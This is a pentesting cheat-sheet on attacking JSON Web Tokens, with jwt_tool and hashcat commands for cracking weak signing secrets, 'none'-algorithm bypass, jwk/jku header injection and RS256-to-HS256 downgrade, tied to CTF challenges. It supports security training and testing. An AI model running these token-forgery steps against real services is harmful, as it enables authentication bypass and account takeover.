# JSON Web Token (JWT)

[![hacking_jwt](../../../../_badges/hacktricks/hacking_jwt.svg)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
[![json_web_token](../../../../_badges/poat/json_web_token.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)

<div class="row row-cols-lg-2"><div>

JSON Web Token (JWT) are used to represent signed data. They are commonly used in for authentication and authorization.

The format is: `<algo>.<data>.<signature>`. Each part is base64 encoded, so the final string is URL-safe while it can be easily decoded.

The data is signed using a secret key. If the secret key is compromised, everyone can sign messages 🔏.

The signature is used to detect if data was tampered with.
</div><div>

They can be transferred and found in:

* 📚 Headers (`Authorization: Bearer <JWT>`)
* 🍪 Cookies
* 📄 URL Parameters
* 💼 Request Body
* ...

📚 A common handy wordlist is [jwt-secrets](https://github.com/wallarm/jwt-secrets).
</div></div>

<hr class="sep-both">

## Common JWT Attacks

<div class="row row-cols-lg-2"><div>

You can use [jwt-tools](https://github.com/ticarpi/jwt_tool) <small>(4.8k ⭐)</small> to attack JWT:

```shell!
$ git clone https://github.com/ticarpi/jwt_tool.git $HOME/tools/jwt_tool
$ chmod +x $HOME/tools/jwt_tool/jwt_tool.py
$ ln -s $HOME/tools/jwt_tool/jwt_tool.py $HOME/.local/bin/jwt_tool
$ jwt_tool -h
```

```ps
$ jwt_tool 'jwt'             # decode
$ jwt_tool 'jwt' -T          # encode
$ jwt_tool 'jwt' -I -pc claim -pv value
```

You can also use [jwt.io](https://jwt.io/).

#### Secret Key Brute Forcing

[![jwt_weak_secret](../../../../_badges/rootme/web_server/jwt_weak_secret.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)

The secret key may be weak and brute forced:

```ps
$ jwt_tool 'jwt' -T -p "key" # use secret key
$ jwt_tool 'jwt' -C -d ./jwt.secrets.list # crack key
```

```ps
$ hashcat -m 16500 hash ./jwt.secrets.list
```

#### JWT Header Injection — None Algorithm

[![jwt_introduction](../../../../_badges/rootme/web_server/jwt_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Introduction)

We may be able to disable the tampering check by setting the signature algorithm to 'none.'

```ps
$ jwt_tool 'jwt' -T -X a     # attack 'algo=none'
```

📚 It also possible for the signature to not be checked at all by the server after issuing a JWT even if there is an algorithm.
</div><div>

#### JWT Header Injection — JWK

[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)

JWT may use the `jwk` header to represent the RSA key used to sign the data. We may be able to inject our own RSA key.

```ps
$ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
                             # -hc kid -hv jwt_tool
```

#### JWT Header Injection — JKU

[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)

The `jku` header contains a URL or a filename used to fetch a key.

```shell!
$ cat $HOME/.jwt_tool/jwttool_custom_jwks.json # upload to URL as jwks.json
$ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
```

📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight on URLs <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).

#### JWT Header Injection — KID

[![jwt_header_injection](../../../../_badges/rootme/web_server/jwt_header_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
[![jwt_unsecure_key_handling](../../../../_badges/rootme/web_server/jwt_unsecure_key_handling.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)

The `kid` header may be added to the header to determine which key to use when there are multiple keys. It must match the `kid` header inside the `jwt` object or a `jwt` loaded from the `jku` endpoint.

#### JWT Header Injection — RS256 to HS256

[![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)

When using RS256 algorithm, JWT uses the private key to sign the JWK and the public key to verify integrity. We may be able to perform a downgrade attack to HS256 and only use a public key for both.

```ps
$ jwt_tool 'jwt' -S hs256 -k public.key -T
```

You can compute the public key if you have two messages:

```ps
$ docker run -it ttervoort/jws2pubkey "JWT1" "JWT2"
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [PortSwigger JWT](https://portswigger.net/web-security/jwt)
* [JWT](https://jwt.io/), (Bearer, encrypted token), modern alternative to (apache) HTTP basic auth? (from=35). HTB/170. [RFC](https://tools.ietf.org/html/rfc7617).
* [CVE-2022-39227](https://github.com/user0x1337/CVE-2022-39227) for `python-jwt<3.3.4`: given a token, forge fake tokens
* [jwtcrack/jwt2john](https://github.com/Sjord/jwtcrack)
</div><div>
</div></div>